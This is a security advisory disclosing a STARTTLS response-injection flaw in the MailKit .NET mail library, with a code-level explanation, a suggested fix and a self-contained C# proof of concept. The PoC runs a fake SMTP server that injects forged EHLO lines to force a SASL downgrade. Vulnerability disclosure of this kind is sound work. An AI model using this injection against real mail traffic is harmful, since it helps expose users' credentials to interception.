# [M] MailKit has STARTTLS Response Injection via unflushed stream buffer that enables SASL mechanism downgrade

## Summary
Severity: Medium
Advisory: GHSA-9j88-vvj5-vhgr
CVE: CVE-2026-41319
CWE: CWE-74
Ecosystem: NuGet
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-04-18
Source: https://github.com/advisories/GHSA-9j88-vvj5-vhgr
Type: github-advisory

## Affected
- NuGet: `MailKit` — affected >=0 <4.16.0

## Details
### Summary

A STARTTLS Response Injection vulnerability in MailKit allows a Man-in-the-Middle attacker to inject arbitrary protocol responses across the plaintext-to-TLS trust boundary, enabling SASL authentication mechanism downgrade (e.g., forcing PLAIN instead of SCRAM-SHA-256). The internal read buffer in `SmtpStream`, `ImapStream`, and `Pop3Stream` is not flushed when the underlying stream is replaced with `SslStream` during STARTTLS upgrade, causing pre-TLS attacker-injected data to be processed as trusted post-TLS responses. This is the same vulnerability class as CVE-2021-23993 (Thunderbird), CVE-2021-33515 (Dovecot), and CVE-2011-0411 (Postfix).

### Details

The `Stream` property in `SmtpStream` (line 84-86), `ImapStream`, and `Pop3Stream` is a simple auto-property with no buffer reset:

```csharp
public Stream Stream {
    get; internal set;  // ← No buffer reset on set!
}
```

During the STARTTLS upgrade in `SmtpClient.cs` (lines 1372-1389):

```csharp
// Reads STARTTLS response — "220 Ready" consumed, any extra data stays in buffer
response = Stream.SendCommand("STARTTLS\r\n", cancellationToken);

// Swaps to TLS — buffer NOT flushed!
var tls = new SslStream(stream, false, ValidateRemoteCertificate);
Stream.Stream = tls;
SslHandshake(tls, host, cancellationToken);

// Reads EHLO response — processes INJECTED pre-TLS data from buffer first!
Ehlo(true, cancellationToken);
```

A MitM appends extra data after the `"220 Ready\r\n"` STARTTLS response. Both arrive in one TCP read into `SmtpStream`'s 4096-byte internal buffer. `ReadResponse()` parses `"220 Ready"` and stops — the injected data remains at `inputIndex`. After `Stream.Stream = tls`, the buffer is not cleared. When `Ehlo()` calls `ReadResponse()`, it checks `inputIndex == inputEnd` — this is FALSE (injected data exists), so it processes the buffered pre-TLS data without reading from the new TLS stream.

The same pattern exists in `ImapClient.cs` (lines 1485-1509) and `Pop3Client.cs`.

**Attack flow:**
```
Client                    MitM                     Real Server
  |--- STARTTLS ---------->|--- STARTTLS ----------->|
  |                        |<-- 220 Ready -----------|
  |<-- "220 Ready\r\n"-----|                         |
  |    "250-evil\r\n"       |  ← INJECTED            |
  |    "250 AUTH PLAIN\r\n" |  ← INJECTED            |
  |    "250 OK\r\n"         |  ← INJECTED            |
  |===== TLS HANDSHAKE ====|==== PASSES THROUGH =====|
  |--- EHLO (over TLS) --->|                         |
  | Reads from BUFFER:     |                         |
  | "250 AUTH PLAIN"       |  ← PRE-TLS DATA        |
  | PROCESSED AS POST-TLS! |                         |
```

**Suggested fix:** Reset buffer indices when the stream is replaced:
```csharp
internal set { stream = value; inputIndex = inputEnd; }
```

### PoC

Self-contained C# PoC — creates a fake SMTP server that injects a crafted EHLO response into the STARTTLS reply:

```csharp
using System; using System.Net; using System.Net.Security; using System.Net.Sockets;
using System.Security.Cryptography; using System.Security.Cryptography.X509Certificates;
using System.Text; using System.Threading; using System.Threading.Tasks;
using MailKit.Net.Smtp; using MailKit.Security;

class PoC {
    static void Main() {
        using var rsa = RSA.Create(2048);
        var req = new CertificateRequest("CN=test", rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
        var cert = new X509Certificate2(req.CreateSelfSigned(
            DateTimeOffset.UtcNow.AddDays(-1), DateTimeOffset.UtcNow.AddDays(365)).Export(X509ContentType.Pfx));

        var listener = new TcpListener(IPAddress.Loopback, 0);
        listener.Start();
        int port = ((IPEndPoint)listener.LocalEndpoint).Port;

        Task.Run(() => {
            using var tcp = listener.AcceptTcpClient();
            var s = tcp.GetStream();
            Send(s, "220 evil.example.com ESMTP\r\n");
            Read(s);
            Send(s, "250-evil.example.com\r\n250-STARTTLS\r\n250-AUTH SCRAM-SHA-256\r\n250 OK\r\n");
            Read(s);
            // ATTACK: inject fake EHLO response after "220 Ready"
            Send(s, "220 Ready\r\n250-evil.example.com\r\n250-AUTH PLAIN LOGIN\r\n250 OK\r\n");
            var ssl = new SslStream(s, false);
            ssl.AuthenticateAsServer(cert, false, false);
            ReadSsl(ssl);
            SendSsl(ssl, "250-evil.example.com\r\n250-AUTH SCRAM-SHA-256\r\n250 OK\r\n");
            Thread.Sleep(2000);
        });

        using var client = new SmtpClient();
        client.ServerCertificateValidationCallback = (a, b, c, d) => true;
        client.Connect("127.0.0.1", port, SecureSocketOptions.StartTls);
        Console.WriteLine($"Auth mechanisms: {string.Join(", ", client.AuthenticationMechanisms)}");
        // OUTPUT: "Auth mechanisms: PLAIN, LOGIN"
        // Server advertised SCRAM-SHA-256 — DOWNGRADE CONFIRMED
        client.Disconnect(false); listener.Stop();
    }
    static void Send(NetworkStream s, string d) { s.Write(Encoding.ASCII.GetBytes(d)); s.Flush(); }
    static string Read(NetworkStream s) { var b = new byte[4096]; return Encoding.ASCII.GetString(b, 0, s.Read(b)); }
    static void SendSsl(SslStream s, string d) { s.Write(Encoding.ASCII.GetBytes(d)); s.Flush(); }
    static string ReadSsl(SslStream s) { var b = new byte[4096]; return Encoding.ASCII.GetString(b, 0, s.Read(b)); }
}
```

**Result against MailKit 4.12.0:**
```
Auth mechanisms: PLAIN, LOGIN
(Real server advertised SCRAM-SHA-256 — SASL mechanism DOWNGRADE achieved)
```

### Impact

Any application using MailKit with `SecureSocketOptions.StartTls` or `StartTlsWhenAvailable` (the default) is vulnerable. A network Man-in-the-Middle attacker can inject arbitrary SMTP/IMAP/POP3 responses that cross the plaintext-to-TLS trust boundary, enabling SASL authentication mechanism downgrade and capability manipulation. All three protocols (SMTP, IMAP, POP3) share the same vulnerable pattern. All MailKit versions through 4.12.0 are affected.

## References
- https://github.com/jstedfast/MailKit/security/advisories/GHSA-9j88-vvj5-vhgr
- https://nvd.nist.gov/vuln/detail/CVE-2026-41319
- https://github.com/jstedfast/MailKit
